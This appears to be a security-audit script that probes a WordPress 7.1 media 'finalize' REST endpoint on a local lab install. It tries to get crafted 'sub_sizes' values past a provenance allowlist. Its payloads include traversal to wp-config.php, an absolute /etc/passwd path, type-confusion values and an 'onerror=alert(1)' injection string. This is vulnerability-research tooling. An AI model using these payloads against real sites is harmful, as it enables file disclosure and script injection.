#!/usr/bin/env python3
"""
Try to get a path-bearing value past WordPress 7.1's finalize provenance
allowlist (validate_sub_size_provenance), which is the fix for HackerOne
#3931777 / #3931771. The sinks those reports named are still unescaped /
unconfined in 7.1, so a bypass here re-opens them.
"""
import json
import struct
import zlib
import subprocess
from wplab import sess, BASE

WP = "/home/user/wpaudit/wordpress"


def png(w=600, h=400):
    def chunk(t, d):
        c = t + d
        return struct.pack('>I', len(d)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)
    raw = b''.join(b'\x00' + b'\xff' * (w * 3) for _ in range(h))
    return (b'\x89PNG\r\n\x1a\n'
            + chunk(b'IHDR', struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0))
            + chunk(b'IDAT', zlib.compress(raw))
            + chunk(b'IEND', b''))


s = sess("author")
n = s.fetch_rest_nonce()


def upload(name, body, ctype="image/png"):
    return s.s.post(BASE + "/index.php?rest_route=/wp/v2/media",
                    headers={"X-WP-Nonce": n,
                             "Content-Disposition": 'attachment; filename="%s"' % name,
                             "Content-Type": ctype}, data=body)


def sideload(aid, size, name, body, ctype="image/png", extra=""):
    return s.s.post(
        BASE + f"/index.php?rest_route=/wp/v2/media/{aid}/sideload&image_size={size}{extra}",
        headers={"X-WP-Nonce": n,
                 "Content-Disposition": 'attachment; filename="%s"' % name,
                 "Content-Type": ctype}, data=body)


def finalize(aid, sub_sizes):
    return s.rest("POST", f"/wp/v2/media/{aid}/finalize", json={"sub_sizes": sub_sizes})


def meta(aid):
    out = subprocess.run(["wp", "--allow-root", "--path=" + WP, "post", "meta", "get",
                          str(aid), "_wp_attachment_metadata", "--format=json"],
                         capture_output=True, text=True).stdout.strip()
    return out


def provenance(aid):
    out = subprocess.run(["wp", "--allow-root", "--path=" + WP, "db", "query",
                          f"SELECT meta_value FROM wp_postmeta WHERE post_id={aid} "
                          f"AND meta_key='_wp_sideloaded_file'"],
                         capture_output=True, text=True).stdout.strip()
    return out.replace("\n", " | ")


r = upload("prov.png", png())
aid = r.json()["id"]
print("attachment:", aid, r.json().get("source_url"))
print("_wp_attached_file:",
      subprocess.run(["wp", "--allow-root", "--path=" + WP, "post", "meta", "get",
                      str(aid), "_wp_attached_file"], capture_output=True, text=True).stdout.strip())

print("\n-- a legitimate sideload, to populate provenance --")
r = sideload(aid, "thumbnail", "prov-150x150.png", png(150, 150))
print("  sideload thumbnail:", r.status_code, r.text[:200])
r = sideload(aid, "scaled", "prov-scaled.png", png(600, 400))
print("  sideload scaled   :", r.status_code, r.text[:250])
print("  provenance rows   :", provenance(aid))

print("\n-- provenance bypass attempts --")
attempts = [
    ("plain traversal",        [{"image_size": "thumbnail", "file": "../../../wp-config.php",
                                 "width": 150, "height": 150}]),
    ("absolute path",          [{"image_size": "thumbnail", "file": "/etc/passwd",
                                 "width": 150, "height": 150}]),
    ("original w/ traversal",  [{"image_size": "original", "file": "../../x.png",
                                 "width": 600, "height": 400}]),
    ("original_image trav",    [{"image_size": "scaled", "file": "prov-scaled.png",
                                 "original_image": "../../x.png",
                                 "width": 600, "height": 400}]),
    ("allowed name + ./",      [{"image_size": "thumbnail", "file": "./prov-150x150.png",
                                 "width": 150, "height": 150}]),
    ("allowed name + space",   [{"image_size": "thumbnail", "file": "prov-150x150.png ",
                                 "width": 150, "height": 150}]),
    ("allowed name uppercase", [{"image_size": "thumbnail", "file": "PROV-150X150.PNG",
                                 "width": 150, "height": 150}]),
    ("file as array",          [{"image_size": "thumbnail", "file": ["prov-150x150.png"],
                                 "width": 150, "height": 150}]),
    ("file as number",         [{"image_size": "thumbnail", "file": 0,
                                 "width": 150, "height": 150}]),
    ("grouped size names",     [{"image_size": ["thumbnail", "medium"],
                                 "file": "../../../wp-config.php",
                                 "width": 150, "height": 150}]),
    ("attached-file w/ dir",   [{"image_size": "thumbnail", "file": "2026/09/prov.png",
                                 "width": 150, "height": 150}]),
    ("basename of attached",   [{"image_size": "thumbnail", "file": "prov.png",
                                 "width": 150, "height": 150}]),
    ("quote in name",          [{"image_size": "thumbnail", "file": 'a.png" onerror=alert(1) x="',
                                 "width": 150, "height": 150}]),
    ("dir-form under sizes",   [{"image_size": "medium", "file": "2026/09/prov-scaled.png",
                                 "width": 300, "height": 200}]),
]
for label, subs in attempts:
    r = finalize(aid, subs)
    body = r.text[:150].replace("\n", " ")
    print(f"  {label:24s} {r.status_code} {body}")

print("\n-- resulting stored metadata --")
print(" ", meta(aid))
